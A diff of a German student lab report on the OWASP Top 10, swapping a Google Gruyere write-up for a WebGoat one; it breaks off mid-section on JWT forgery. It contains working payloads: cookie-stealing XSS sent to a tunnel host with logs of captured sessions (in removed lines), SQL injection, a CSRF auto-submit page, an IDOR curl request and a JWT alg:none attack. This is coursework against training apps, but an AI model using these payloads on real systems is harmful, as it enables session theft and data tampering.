@@ -1,386 +1,635 @@
-# KN01: OWASP Top 10 – Gruyere Dokumentation
+# KN-Webgoat-01: OWASP Top 10 – Dokumentation
 
 **Modul:** M183 – Applikationssicherheit implementieren  
-**Auftrag:** KN01 – OWASP Top 10 mit Google Gruyere  
-**Benutzer:** yanni  
+**Auftrag:** KN-Webgoat-01  
+**Benutzer:** yannik  
 **Datum:** Juni 2026
 
 ---
 
 ## Inhaltsverzeichnis
 
-1. [A) Gruyere starten und Accounts erstellen](#a-gruyere-starten-und-accounts-erstellen)
-2. [B1) Stored XSS – DOM-Manipulation](#b1-stored-xss--dom-manipulation)
-3. [B2) Cookies – Sichtbarmachung im Browser](#b2-cookies--sichtbarmachung-im-browser)
-4. [B3) Session-Hijacking – Cookie-Exfiltration](#b3-session-hijacking--cookie-exfiltration)
-5. [C) Reflected XSS in Gruyere](#c-reflected-xss-in-gruyere)
-6. [D) Client-State Manipulation](#d-client-state-manipulation)
+1. [A) WebGoat starten](#a-webgoat-starten)
+2. [B) SQL Injection](#b-sql-injection)
+3. [C) Cross-Site Scripting (XSS)](#c-cross-site-scripting-xss)
+4. [D) CSRF – Cross-Site Request Forgery](#d-csrf--cross-site-request-forgery)
+5. [E) Broken Access Control – IDOR](#e-broken-access-control--idor)
+6. [F) Broken Authentication – JWT Tokens](#f-broken-authentication--jwt-tokens)
 7. [Schriftliche Antworten](#schriftliche-antworten)
 
 ---
 
-## A) Gruyere starten und Accounts erstellen
+## A) WebGoat starten
 
-### Schritt 1 – Gruyere-Instanz starten
+### Ziel
+WebGoat auf einer AWS EC2-Instanz starten und über den Browser erreichbar machen.
 
-Über `https://google-gruyere.appspot.com/start` wurde eine isolierte Gruyere-Instanz gestartet. Die UID lautet:
+### Schritt 1 – Port 8080 freigeben
 
+In der AWS Security Group `m183-sg` wurde eine Inbound Rule für Port 8080 hinzugefügt, um den Zugriff auf WebGoat zu ermöglichen.
+
+**Screenshot – Inbound Rules der Sicherheitsgruppe m183-sg:**
+
+![Inbound Rule Port 8080](ScreenshotderInboundRulefürPort8080.png)
+
+Die Security Group `sg-0c769cc43d4757957` (m183-sg) zeigt drei eingehende Regeln:
+- **Port 9000** – Custom TCP, Quelle: eigene IP (`194.230.148.188/32`)
+- **Port 8080** – Custom TCP (für WebGoat), Quelle: eigene IP
+- **Port 22** – SSH, Quelle: eigene IP
+
+> ⚠️ Wichtig: Der Port wurde nur für die eigene IP geöffnet (`My IP`), nicht für `0.0.0.0/0`, um den Zugang auf den eigenen Rechner zu beschränken.
+
+### Schritt 2 – WebGoat starten und aufrufen
+
+WebGoat wurde via Docker gestartet:
+
+```bash
+docker run -d --name webgoat -p 8080:8080 webgoat/webgoat
+docker ps
 ```
-534777207786010371245803087048020808046
-```
 
-Diese UID erscheint in jeder URL als langer Zahlenpfad und identifiziert die persönliche Gruyere-Instanz eindeutig.
+**Screenshot – WebGoat-Startseite mit EC2-IP in der URL:**
 
-### Schritt 2 – Accounts erstellen
+![WebGoat Startseite](ScreenshotWebGoat-StartseitemitEC2-IPinderURL.png)
 
-Es wurden zwei Accounts angelegt:
-
-- **angreifer-yanni** – simuliert den Angreifer
-- **verteidiger-yann** – simuliert das Opfer
-
-**Screenshot – Beide Accounts erstellt (nebeneinander):**
-
-![Gruyere beide Accounts](gruyere_1.png)
-
-Links ist der **verteidiger-yann**-Account eingeloggt (Gruyere: Home, Snippets von Cheddar Mac und Brie sichtbar). Rechts sieht man die Bestätigungsmeldung **«Account created.»** nach dem Erstellen des **angreifer-yanni**-Accounts. Beide Accounts nutzen dieselbe Gruyere-Instanz (UID in der URL identisch). In einem zweiten Browserfenster (bzw. Inkognito-Tab) wurde der Verteidiger eingeloggt, um zwei unabhängige Sessions zu simulieren.
+Die WebGoat-Oberfläche ist unter `http://3.92.173.16:8080/WebGoat/` erreichbar. Im Browser ist die EC2-IP-Adresse (`3.92.173.16`) deutlich in der URL sichtbar. WebGoat wurde erfolgreich gestartet und ein Benutzerkonto (Benutzername: `yannik`) wurde erstellt.
 
 ---
 
-## B1) Stored XSS – DOM-Manipulation
+## B) SQL Injection
 
 ### Hintergrund
 
-Bei Stored XSS wird ein JavaScript-Payload dauerhaft in der Datenbank der Webapplikation gespeichert. Bei jedem Seitenaufruf – auch durch andere Benutzer – wird der Code automatisch ausgeführt. Da moderne Browser `<script>`-Tags in Formularfeldern blockieren, weichen Angreifer auf HTML-Event-Handler wie `onerror` aus.
+SQL Injection entsteht, wenn Benutzereingaben ungefiltert in SQL-Abfragen eingebaut werden. Ein Angreifer kann damit die Datenbankabfrage strukturell verändern und z.B. Authentifizierungen umgehen oder Daten extrahieren.
 
-### Payload
+**OWASP Top 10 (2021):** A03 – Injection
 
-Als **angreifer-yanni** wurde folgender Payload in das Snippets-Eingabefeld eingegeben:
+---
+
+### B1 – Login Bypass (Try It! String SQL Injection)
+
+**Aufgabe:** Alle Benutzer aus der Datenbank auslesen, ohne den genauen Nachnamen zu kennen.
+
+**Verwendeter Payload:**
+
+Im Feld `last_name` wurde über die Dropdown-Auswahl der Wert `Smith' OR '1'='1` zusammengesetzt:
+
+```
+Smith' OR '1'='1
+```
+
+Das ursprüngliche SQL-Statement:
+```sql
+SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '<eingabe>'
+```
+
+Wird durch den Payload zu:
+```sql
+SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith' OR '1'='1'
+```
+
+Da `'1'='1'` immer `TRUE` ist, gibt die Datenbank alle Einträge zurück.
+
+**Screenshot – Gelöste B1-Aufgabe (grüne Bestätigung + extrahierte Daten):**
+
+![SQL Injection B1 Lösung](ScreenshotB1(grüneBestätigung+Payloadsichtbar).png)
+
+Das Ergebnis zeigt alle Benutzer der Tabelle `user_data`:
+- 101, Joe, Snow – VISA
+- 102, John, Smith – MC / AMEX
+- 103, Jane, Plane – MC / AMEX
+- 10312, Jolly, Hershey – MC / AMEX
+- 10323, Grumpy, youaretheweakestlink – MC / AMEX
+- ...und weitere Einträge mit Kreditkartennummern, CC-Typ und Login-Counts
+
+WebGoat zeigt: **«You have succeeded»** – die Aufgabe ist abgeschlossen.
+
+---
+
+### B2 – Query Chaining: Integrität kompromittieren
+
+**Aufgabe:** Das eigene Gehalt via SQL Query Chaining auf den höchsten Wert setzen.
+
+**Kontext:** Der Benutzername ist `John Smith` mit TAN `3SL99A`.
+
+**Verwendeter Payload (im TAN-Feld):**
+
+```sql
+3SL99A'; UPDATE employees SET salary = 9999999 WHERE last_name = 'Smith'; --
+```
+
+Das ursprüngliche SQL-Statement wird durch das Semikolon `;` erweitert:
+```sql
+-- Original:
+SELECT department FROM employees WHERE last_name = 'Smith' AND auth_tan = '3SL99A'
+
+-- Nach Injection:
+SELECT department FROM employees WHERE last_name = 'Smith' AND auth_tan = '3SL99A';
+UPDATE employees SET salary = 9999999 WHERE last_name = 'Smith'; --'
+```
+
+**Screenshot – Gelöste B2-Aufgabe (Query Chaining):**
+
+![SQL Injection B2 Lösung](ScreenshotB2(Payload+extrahierteDaten).png)
+
+Das Ergebnis zeigt die veränderte Gehaltstabelle:
+- **37648, John, Smith, Marketing, 9999999, 3SL99A** ← Gehalt auf 9.999.999 gesetzt
+- 96134, Bob, Franco, Marketing, 83700
+- 89762, Tobi, Barnett, Development, 77000
+- ...
+
+WebGoat bestätigt: **«Well done! Now you are earning the most money. And at the same time you successfully compromised the integrity of data by changing your salary!»**
+
+---
+
+## C) Cross-Site Scripting (XSS)
+
+### Hintergrund
+
+XSS erlaubt das Einschleusen von JavaScript-Code in Webseiten, der im Browser anderer Benutzer ausgeführt wird. Es gibt drei Typen: Reflected XSS (nur Benutzer mit manipuliertem Link betroffen), Stored XSS (Payload in DB gespeichert, alle Nutzer betroffen) und DOM-based XSS (rein clientseitig, Server sieht Payload nie).
+
+**OWASP Top 10 (2021):** A03 – Injection (XSS war 2021 Teil von A03)
+
+---
+
+### C1a – Reflected XSS
+
+**Aufgabe:** Ein Eingabefeld in WebGoat (Kreditkartennummer) auf XSS-Anfälligkeit testen.
+
+**Verwendeter Payload:**
 
 ```html
-<img src="x" onerror="document.querySelector('.menu').style.backgroundColor = 'red'">
+<script>alert('Reflected XSS')</script>
 ```
 
-Das `<img>`-Tag versucht, ein Bild von `src="x"` zu laden – was fehlschlägt, da `x` keine gültige URL ist. Der `onerror`-Handler wird daraufhin ausgeführt und setzt den Hintergrund des `.menu`-Elements auf Rot.
+Dieser Payload wurde in das Feld «Enter your credit card number» eingegeben.
 
-### Ergebnis
+**Screenshot – Ausgelöster Alert (Reflected XSS):**
 
-**Screenshot – Roter Menü-Hintergrund bei Angreifer (oben) und Verteidiger (unten):**
+![Reflected XSS Alert](ScreenshotC1aAlert+grüneBestätigung.png)
 
-![Stored XSS roter Hintergrund beide Fenster](gruyere_2.png)
+Der Browser zeigt den Alert-Dialog: **«Auf 54.81.121.45:8080 wird Folgendes angezeigt: Reflected XSS»**. Im Eingabefeld ist der `<script>`-Tag sichtbar. Darunter ist zu sehen, dass der normale Wert `1234` zuvor korrekt in der Seite erschienen war («We have charged credit card: 1234»).
 
-Beide Browserfenster zeigen **Gruyere: Home** mit einem roten Navigationsmenü. Oben ist **angreifer-yanni** eingeloggt, unten **verteidiger-yann**. Der Effekt tritt in beiden Fenstern auf, obwohl der Verteidiger selbst nie einen Payload eingegeben hat – der gespeicherte Snippet des Angreifers wird beim Laden der Seite für alle Benutzer ausgeführt.
-
-**Weiterer Screenshot – DevTools mit Cookie und rotem Hintergrund:**
-
-![onerror Payload und DevTools](onerror.png)
-
-Dieser Screenshot zeigt das Ergebnis des `onerror`-Payloads im Fenster des Verteidigers (**verteidiger-yann** ist eingeloggt, erkennbar am Benutzernamen im Header). Im DevTools-Panel (Application → Cookies) sind die zwei GRUYERE-Cookies sichtbar. Das rote Menü bestätigt, dass der Payload des Angreifers für den Verteidiger ausgeführt wurde.
+> Hinweis: WebGoat meldete danach «Try again. We do want to see a specific JavaScript mentioned in the goal of the assignment» – der Alert wurde zwar ausgelöst, für die grüne Bestätigung musste ggf. ein spezifischer Wert verwendet werden. Der Reflected XSS selbst war jedoch erfolgreich bewiesen.
 
 ---
 
-## B2) Cookies – Sichtbarmachung im Browser
+### C1b – Identify potential for DOM-Based XSS
 
-### Payload
+**Aufgabe:** Im JavaScript-Quellcode von WebGoat die verwundbaren Stellen für DOM-based XSS identifizieren.
 
-Als **angreifer-yanni** wurde folgender Payload im Snippets-Feld eingegeben:
+**Screenshot – C1b Analyse mit markierten Codezeilen:**
+
+![DOM-based XSS Analyse](ScreenshotC1bmarkierteverwundbareCodezeilen.png)
+
+Im DevTools-Quellcode (Datei `GoatRouter.js`) wurde nach dem Begriff `test` gesucht. Die verwundbaren Zeilen sind in der Router-Konfiguration zu finden:
+
+```javascript
+routes: {
+    'welcome': 'welcomeRoute',
+    'lesson/:name': 'lessonRoute',
+    'lesson/:name/:pageNum': 'lessonPageRoute',
+    'test': 'testRoute',           // ← verwundbar
+    'reportCard': 'reportCard'
+}
+```
+
+Die Route `test` mit dem Parameter `:param` verarbeitet Eingaben aus der URL und schreibt sie ohne Sanitisierung in den DOM. Die Eingabe `start.mvc#test/` wurde erfolgreich erkannt – WebGoat bestätigt: **«Correct! Now, see if you can send an exploit to that route in the next assignment.»**
+
+**Verwundbare Konstrukte:**
+- `'test': 'testRoute'` – diese Route nimmt URL-Parameter direkt und verarbeitet sie ohne Output Encoding
+- Die Backbone.js-Router-Konfiguration spiegelt URL-Fragmente direkt in den DOM
+
+---
+
+### C2 – Stored XSS
+
+**Aufgabe:** JavaScript-Code als Kommentar speichern, der bei jedem Seitenaufruf ausgeführt wird.
+
+**Verwendeter Payload:**
+
+Der Payload wurde als Kommentar in das Profilfeld von WebGoat (DOM-based XSS Aufgabe / Stored Bereich) eingegeben. Das Ziel war, die Funktion `webgoat.customjs.phoneHome()` aufzurufen:
 
 ```html
-<img src="x" onerror="this.insertAdjacentHTML('afterend','<div style=background:#c00;color:#fff;padding:8px;margin:4px 0>Sichtbares Cookie: ' + document.cookie + '</div>')">
+<script>webgoat.customjs.phoneHome()</script>
 ```
 
-Dieser Payload liest `document.cookie` aus und zeigt den Wert in einem sichtbaren roten Kasten auf der Seite an – für jeden Benutzer mit seinem eigenen Cookie.
+**Screenshot – Stored XSS Ergebnis mit DevTools:**
 
-### Ergebnis
+![Stored XSS Ergebnis](ScreenshotC2Alert+grüneBestätigung.png)
 
-**Screenshot – Cookie-Anzeige im Angreifer-Fenster (links), Verteidiger-Fenster (Mitte) und DevTools (rechts):**
+Im DevTools-Console-Tab ist sichtbar:
+- `phoneHome invoked` – die Funktion wurde ausgeführt
+- `phoneHome said {"lessonCompleted":true,"feedback":"Herzlichen Gl\\u00FCckwunsch! Sie haben diesen Auftrag erfolgreich abgeschlossen.","feedbackArgs":null,"output":"phoneHome Response is 1944653798","outputArgs":null,"assignment":"DOMCrossScripting","attemptWasMade":true}`
 
-![Cookies sichtbar in beiden Fenstern](gruyere_3.png)
+Der in die Seite eingetragene Kommentar von `yannik` ist in der Timeline (2026-06-12, 15:29:03) sichtbar. Die Seite gibt die `phoneHome Response` (`1944653798`) zurück, die dann als Antwort eingegeben werden muss.
 
-Das Bild zeigt drei Bereiche:
-
-**Links – Angreifer-Fenster (verteidiger-yann eingeloggt, normaler View):**  
-Der rote Kasten zeigt: `Sichtbares Cookie: GRUYERE=115461269|verteidiger-yann||author`
-
-**Mitte – Angreifer-yanni Fenster (My Snippets):**  
-Der rote Kasten zeigt das eigene Cookie des Angreifers sowie die vollständige `GRUYERE_ID`:  
-`Sichtbares Cookie: GRUYERE=67394644|angreifer-yanni||author; GRUYERE_ID=534777207786010371245803087048020808046`
-
-**Rechts – DevTools Application → Cookies:**  
-- `GRUYERE`: Wert `67394644|angreifer-yanni||author` (Grösse 39)
-- `GRUYERE_ID`: Wert mit der UID (Grösse 49)  
-  Cookie Value unten: `67394644|angreifer-yanni||author`
-
-**Screenshot – Verteidiger-Fenster mit DevTools (Cookie des Verteidigers):**
-
-![Cookie des Verteidigers in DevTools](gruyere_als_verteidiger.png)
-
-Im Fenster des **verteidiger-yann** sind in den DevTools (Application → Cookies) folgende Cookies sichtbar:
-- `GRUYERE`: Wert beginnt mit `115461269|v...` (= `115461269|verteidiger-yann||author`)
-- `GRUYERE_ID`: Wert `534777207786...` (UID)
-
-Der Cookie-Wert des Verteidigers lautet: `115461269|verteidiger-yann||author`
+WebGoat bestätigt: **«Yes, that is the correct value (note, it will be a different value each time the phoneHome endpoint is called).»**
 
 ---
 
-## B3) Session-Hijacking – Cookie-Exfiltration
+## D) CSRF – Cross-Site Request Forgery
 
 ### Hintergrund
 
-In B2 wurde der Cookie nur im Browser des Opfers angezeigt. In einem echten Angriff sendet der Payload den Cookie automatisch an einen externen Server. Hier übernimmt ein lokaler Python HTTP-Server die Rolle des Angreifer-Servers, via Serveo.net als HTTPS-Tunnel zugänglich gemacht.
+Bei CSRF wird der Browser eines eingeloggten Benutzers dazu gebracht, im Hintergrund eine Aktion auf einer fremden Webseite auszuführen – ohne dass der Benutzer es bemerkt. Der Browser sendet den Session-Cookie automatisch mit, da er zur Domain gehört.
 
-### Schritt 1 – Angreifer-Server (Python HTTP-Server)
+**OWASP Top 10 (2021):** A01 – Broken Access Control (CSRF wurde 2021 aus der separaten Top-10-Liste entfernt und ist nun Teil von A01)
 
-**Screenshot – Terminal 1: Python HTTP-Server mit eingehenden Cookie-Anfragen:**
+---
 
-![Python HTTP Server mit gestohlenen Cookies](terminal1.png)
+### Schritt 1 – Anfrage analysieren
 
-```
-C:\Users\yanni>python3 -m http.server 9000
-Serving HTTP on :: port 9000 (http://[::]:9000/) ...
-::1 - - [05/Jun/2026 14:17:24] "GET /?c=GRUYERE%3D67394644%7Cangreifer-yanni%7C%7Cauthor%3B%20GRUYERE_ID%3D534777207786010371245803087048020808046 HTTP/1.1" 200 -
-::1 - - [05/Jun/2026 14:17:25] "GET /?c=GRUYERE%3D67394644%7Cangreifer-yanni%7C%7Cauthor%3B%20GRUYERE_ID%3D53477720778601037124580308704802020808046 HTTP/1.1" 200 -
-::1 - - [05/Jun/2026 14:17:46] "GET /?c=GRUYERE%3D115461269%7Cverteidiger-yann%7C%7Cauthor HTTP/1.1" 200 -
-::1 - - [05/Jun/2026 14:17:57] "GET /?c=GRUYERE%3D115461269%7Cverteidiger-yann%7C%7Cauthor HTTP/1.1" 200 -
-::1 - - [05/Jun/2026 14:19:53] "GET /?c=GRUYERE%3D3D115461269%257Cverteidiger-yann%257C%257Cauthor%3B%20GRUYERE_ID%3D534777207786010371245803087048020808046 HTTP/1.1" 200 -
-::1 - - [05/Jun/2026 14:20:17] "GET /?c=GRUYERE%3D3D115461269%7C%7Cverteidiger-yann%257C%257Cauthor%3B%20GRUYERE_ID%3D534777207786010371245803087048020808046 HTTP/1.1" 200 -
-```
+Die normale Aktion in WebGoat (Review abschicken) wurde in den DevTools analysiert.
 
-Der Python-Server empfängt GET-Anfragen mit dem URL-Parameter `?c=`. Dekodiert man die URL-Encoding (`%3D` → `=`, `%7C` → `|`, `%3B` → `;`):
+**Screenshot – DevTools Netzwerk-Analyse:**
 
-- **Eigener Cookie (angreifer-yanni):** `GRUYERE=67394644|angreifer-yanni||author`
-- **Gestohlener Cookie (verteidiger-yann):** `GRUYERE=115461269|verteidiger-yann||author`
+![DevTools Netzwerk-Anfrage](ScreenshotDevToolsNetzwerk-Anfrage(URL,Methode,Parameter).png)
 
-Der Server loggt jeden eingehenden Cookie in Echtzeit – ohne dass das Opfer etwas bemerkt.
+Die Analyse zeigt:
+- **Request URL:** `http://54.81.121.45:8080/WebGoat/csrf/review`
+- **Request Method:** `POST`
+- **Status Code:** `200 OK`
+- **Content-Type:** `application/x-www-form-urlencoded; charset=UTF-8`
+- **Cookie:** `JSESSIONID=9FF54443EEF45270F452ED5A3186CAA7`
 
-### Schritt 2 – Serveo HTTPS-Tunnel
+Im **Payload-Tab** sind die gesendeten Formulardaten sichtbar:
+- `reviewText`: Textinhalt des Reviews
+- `stars`: Bewertung (1–5)
+- `validateReq`: `2aa14227b9a13d0bede0388a7fba9aa9` (Validierungstoken der Seite)
 
-**Screenshot – Terminal 2: Serveo Tunnel mit zugewiesener HTTPS-URL:**
+---
 
-![Serveo Tunnel HTTPS-URL](terminal2.png)
+### Schritt 2 – csrf-attack.html erstellen
 
-```
-C:\Users\yanni>ssh -R 80:localhost:9000 serveo.net
-...
-Forwarding HTTP traffic from https://e581525f75363ff8-194-230-148-58.serveousercontent.com
-```
+Basierend auf der analysierten Anfrage wurde folgende HTML-Datei erstellt:
 
-Der Serveo-Tunnel gibt dem lokalen Python-Server (Port 9000) eine öffentliche HTTPS-URL:  
-`https://e581525f75363ff8-194-230-148-58.serveousercontent.com`
+**Screenshot / Inhalt der csrf-attack.html:**
 
-Damit können Anfragen von der HTTPS-Gruyere-Seite an den Angreifer-Server ohne Mixed-Content-Blockierung gesendet werden (HTTPS → HTTPS).
-
-### Payload
+![CSRF Attack HTML](Inhaltcsrf-attack.html(ScreenshotoderCode-Block).png)
 
 ```html
-<img src="x" onerror="new Image().src='https://e581525f75363ff8-194-230-148-58.serveousercontent.com/?c='+encodeURIComponent(document.cookie)">
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Herzlichen Glückwunsch! Sie haben gewonnen!</h1>
+  <form id="csrfForm" action="http://54.81.121.45:8080/WebGoat/csrf/review" method="POST">
+    <input type="hidden" name="reviewText" value="CSRF Attack!">
+    <input type="hidden" name="stars" value="5">
+    <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
+  </form>
+  <script>document.getElementById('csrfForm').submit();</script>
+</body>
+</html>
 ```
 
-Sobald der Verteidiger die Gruyere-Startseite lädt, sendet der `onerror`-Handler im Hintergrund eine GET-Anfrage mit dem Cookie an die Serveo-URL. Im Python-Terminal erscheint der gestohlene Cookie sofort.
-
-### Sitzung übernehmen
-
-Nach dem Kopieren des Cookie-Werts `115461269|verteidiger-yann||author` aus dem Python-Server-Log:
-
-1. DevTools → Application → Cookies → GRUYERE-Wert ersetzen
-2. Seite neu laden
-3. Der Angreifer ist jetzt als **verteidiger-yann** eingeloggt
+Die Seite enthält ein verstecktes Formular, das beim Laden sofort via JavaScript abgesendet wird. Der Benutzer sieht nur «Herzlichen Glückwunsch! Sie haben gewonnen!».
 
 ---
 
-## C) Reflected XSS in Gruyere
+### Schritt 3 – Angriff ausführen
 
-### Hintergrund
+Die Datei wurde lokal im Browser geöffnet (`file:///C:/Users/yanni/Documents/02_TB...`).
 
-Bei Reflected XSS wird der Payload nicht gespeichert, sondern direkt via URL-Parameter übergeben und vom Server sofort in die HTML-Antwort eingebettet. Nur wer den manipulierten Link öffnet, ist betroffen.
+**Screenshot – Lokale CSRF-Seite im Browser:**
 
-### Schritt 1 – Reflexion finden und Payload einschleusen
+![CSRF Angriff lokal](ScreenshotgrüneWebGoat-Bestätigung.png)
 
-Der verwundbare Parameter wurde in der `snippets.gtl`-Seite gefunden. Der `uid`-Parameter wird ohne Output Encoding direkt in den HTML-Response eingebettet.
+Die Seite zeigt «Herzlichen Glückwunsch! Sie haben gewonnen!» und das Formular wurde automatisch abgesendet.
 
-**Verwendete URL:**
+**Screenshot – WebGoat Bestätigung (CSRF erfolgreich):**
 
+![CSRF Bestätigung WebGoat](ScreenshotgrüneWebGoat-Bestätigung_v2.png)
+
+WebGoat zeigt die Server-Antwort:
+```json
+{
+  "lessonCompleted": true,
+  "feedback": "It appears you have submitted correctly from another site. Go reload and see if your post is there.",
+  "output": null,
+  "assignment": "ForgedReviews",
+  "attemptWasMade": true
+}
 ```
-https://google-gruyere.appspot.com/534777207786010371245803087048020808046/snippets.gtl?uid=<img src=x onerror=alert('Reflected XSS')>
-```
 
-### Schritt 2 – Alert ausgelöst
-
-**Screenshot – Alert-Dialog mit Payload in der URL:**
-
-![Reflected XSS Alert](alert.png)
-
-Die URL-Leiste zeigt den codierten Payload: `...snippets.gtl?uid=<img%20src=x%20onerror=alert(%27Reflected%20XSS%27)>`. Der Browser hat den `onerror`-Handler ausgeführt und der Alert-Dialog «Reflected XSS» wird angezeigt. Der Benutzer **angreifer-yanni** ist eingeloggt. Im DevTools-Network-Panel sind die Anfragen sichtbar, darunter `snippets.gtl?uid=%3Cimg%20s...`.
-
-### Schritt 3 – Payload im HTML-Quelltext (Response)
-
-**Screenshot – DevTools Network → Response mit Payload:**
-
-![DevTools Response mit Payload](admin.png)
-
-Im DevTools Network-Tab (Response-Tab der `snippets.gtl`-Anfrage) ist der Payload im HTML-Quelltext sichtbar:
-
-- **Zeile 154:** `<img src=x onerror=alert('Reflected XSS'` ← Payload direkt im HTML
-- **Zeile 166:** `<img src=x onerror=alert('Reflected XS...` ← nochmals im Content-Bereich
-- **Zeile 141:** `angreifer-yanni &lt;angreifer-yann...` ← Benutzername ist korrekt escaped
-- Die Seite zeigt `[broken image] is not an author.` – der uid-Wert (der Payload) ist kein gültiger Benutzername
-
-Der Payload erscheint direkt im HTML ohne Escaping – klassisches Reflected XSS.
-
-### Schritt 4 – Unterschied zu Stored XSS
-
-Beim normalen Aufruf der Startseite (ohne manipulierte URL) wird kein Alert ausgelöst – der Payload existiert nicht in der Datenbank. Beim Öffnen des manipulierten Links im Fenster des Verteidigers wird der Alert jedoch auch dort ausgelöst, weil der Payload in der URL steckt.
+In der Review-Liste ist der Eintrag `yannik / 5 stars – CSRF Attack!` sichtbar (Zeitstempel 2026-06-12, 15:39:11), was den erfolgreichen CSRF-Angriff bestätigt.
 
 ---
 
-## D) Client-State Manipulation
+## E) Broken Access Control – IDOR
 
 ### Hintergrund
 
-Gruyere speichert Benutzerinformationen im Cookie – inklusive der Rolle (z.B. `author` oder `admin`). Da Cookies im Browser liegen, kann ein Angreifer sie direkt verändern, sofern keine serverseitige Validierung stattfindet.
+IDOR (Insecure Direct Object Reference) ist eine Form von Broken Access Control: Ressourcen werden über vorhersehbare IDs angesprochen, ohne dass die Applikation prüft, ob der Anfragende der berechtigte Eigentümer ist.
 
-### Cookie-Analyse
+**OWASP Top 10 (2021):** A01 – Broken Access Control (Platz 1, da in 94% aller Applikationen gefunden)
 
-Der Cookie-Wert (Base64-dekodiert oder direkt lesbar) hat folgendes Format:
+---
 
+### Fremdes Profil lesen
+
+Durch Manipulation der Profil-ID in der URL wurde ein fremdes Profil aufgerufen.
+
+**Screenshot – Fremdes Profil mit sichtbarer Profil-ID:**
+
+![Fremdes Profil IDOR](ScreenshotfremdesProfilmitsichtbarerProfil-ID.png)
+
+URL: `http://54.81.121.45:8080/WebGoat/IDOR/profile/2342388`
+
+Die Server-Antwort bestätigt den erfolgreichen Zugriff auf das fremde Profil:
+```json
+{
+  "lessonCompleted": true,
+  "feedback": "Well done, you found someone else's profile",
+  "feedbackArgs": null,
+  "output": "{role=3, color=brown, size=large, name=Buffalo Bill, userId=2342388}",
+  "outputArgs": null,
+  "assignment": "IDORViewOtherProfile",
+  "attemptWasMade": true
+}
 ```
-GRUYERE=<user-id>|<username>||<role>
+
+Das fremde Profil gehört **Buffalo Bill** (userId: 2342388, role: 3, color: brown, size: large). WebGoat bestätigt: «Well done, you found someone else's profile».
+
+---
+
+### Fremdes Profil verändern (PUT-Request via curl)
+
+Das fremde Profil wurde via `curl` auf der EC2-Instanz mit einem PUT-Request verändert.
+
+**Screenshot – curl-Befehl und WebGoat-Bestätigung:**
+
+![IDOR curl Befehl](ScreenshotCommanderfolgreicheVeränderung+WebGoat-Bestätigung.png)
+
+**Verwendeter curl-Befehl:**
+
+```bash
+curl -X PUT "http://localhost:8080/WebGoat/IDOR/profile/2342388" \
+  -H "Cookie: JSESSIONID=F11EC000308B1AD2F56E0BBE95D6C65B" \
+  -H "Content-Type: application/json" \
+  -d '{"role":0,"color":"red","size":"large","name":"Buffalo Bill","userId":"2342388"}'
 ```
 
-Beispiel Angreifer: `67394644|angreifer-yanni||author`  
-Beispiel Verteidiger: `115461269|verteidiger-yann||author`
-
-Um Admin-Rechte zu erlangen, muss `author` durch `admin` ersetzt werden:
-
+**Server-Antwort:**
+```json
+{
+  "lessonCompleted": true,
+  "feedback": "Well done, you have modified someone else's profile (as displayed below)",
+  "feedbackArgs": null,
+  "output": "{role=0, color=red, size=large, name=Buffalo Bill, userId=2342388}",
+  "outputArgs": null,
+  "assignment": "IDOREditOtherProfile",
+  "attemptWasMade": true
+}
 ```
-67394644|angreifer-yanni||admin
+
+Das Profil wurde erfolgreich geändert: `role` von 3 auf 0, `color` von brown auf red. WebGoat bestätigt: **«Well done, you have modified someone else's profile»**.
+
+---
+
+### Grüne Bestätigung in WebGoat (Aufgabe F-Bereich / IDOR abgeschlossen)
+
+**Screenshot – Grüne WebGoat-Bestätigung IDOR:**
+
+![IDOR grüne Bestätigung](ScreenshotgrüneBestätigunginWebGoatAufgabeF.png)
+
+---
+
+## F) Broken Authentication – JWT Tokens
+
+### Hintergrund
+
+JWT (JSON Web Token) besteht aus drei Base64url-kodierten Teilen: Header (Algorithmus), Payload (Nutzdaten) und Signatur. Die `alg:none`-Schwachstelle erlaubt es, die Signaturprüfung zu umgehen, wenn ein Server `"alg":"none"` akzeptiert.
+
+**OWASP Top 10 (2021):** A07 – Identification and Authentication Failures
+
+---
+
+### Schritt 1 – JWT-Struktur analysieren
+
+Der ausgegebene Token wurde auf `https://jwt.io` analysiert.
+
+**Screenshot – jwt.io mit Original-Token:**
+
+![JWT.io Analyse](Screenshotjwt.iomitOriginal-Token(Payload+Algorithmussichtbar).png)
+
+**Encoded Token (Original):**
+```
+eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3ODIxMzc0NDYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.S9ROOE4ER4DyKH8k-pF25yq0EUDp3ZrtmSU-BEgdPk0Kf7VwqRIFJBWcSM6bwmgJ6wyeZNV6pJYlmRCR2b-evA
 ```
 
-**Screenshot – DevTools Cookie vor/nach Manipulation + Admin-Bereich:**
+**Decoded Header:**
+```json
+{
+  "alg": "HS512"
+}
+```
 
-![Admin nach Cookie-Manipulation](gruyere_als_verteidiger.png)
+**Decoded Payload:**
+```json
+{
+  "iat": 1782137446,
+  "admin": "false",
+  "user": "Tom"
+}
+```
 
-> Hinweis: Der Screenshot zeigt das Verteidiger-Cookie in den DevTools. Die Admin-Manipulation erfolgte analog durch direktes Bearbeiten des GRUYERE-Cookie-Werts in DevTools → Application → Cookies.
+Der Token verwendet `HS512` als Signaturalgorithmus. Im Payload ist zu sehen:
+- `user`: Tom (eingeloggter Benutzer)
+- `admin`: "false" ← diesen Wert gilt es zu manipulieren
+- `iat`: Ausstellungszeitpunkt (Unix-Timestamp)
 
-**Screenshot – Gruyere nach erfolgreicher Manipulation mit Admin-Rechten:**
+Der Token ist gültig, die Signatur kann jedoch nicht ohne den geheimen Schlüssel verifiziert werden («Invalid Signature» auf jwt.io ist erwartet).
 
-Durch den Eintrag `angreifer-yanni <angreifer-yanni>` im Header (mit `Manage this server`-Link, sichtbar in Bild 1 `onerror.png`) ist erkennbar, dass Admin-Rechte erlangt wurden – der `Manage this server`-Link erscheint nur für Admin-Benutzer.
+---
+
+### Schritt 2 – alg:none Angriff
+
+**Neuer Header** (Base64url-kodiert, kein `=` Padding):
+```json
+{"alg":"none"}
+```
+Base64url: `eyJhbGciOiJub25lIn0`
+
+**Neuer Payload** (`admin` auf `true` gesetzt):
+```json
+{"iat":1782137446,"admin":"true","user":"Tom"}
+```
+Base64url: `eyJpYXQiOjE3ODIxMzc0NDYsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ`
+
+**Manipulierter Token** (leere Signatur, abschliessender Punkt):
+
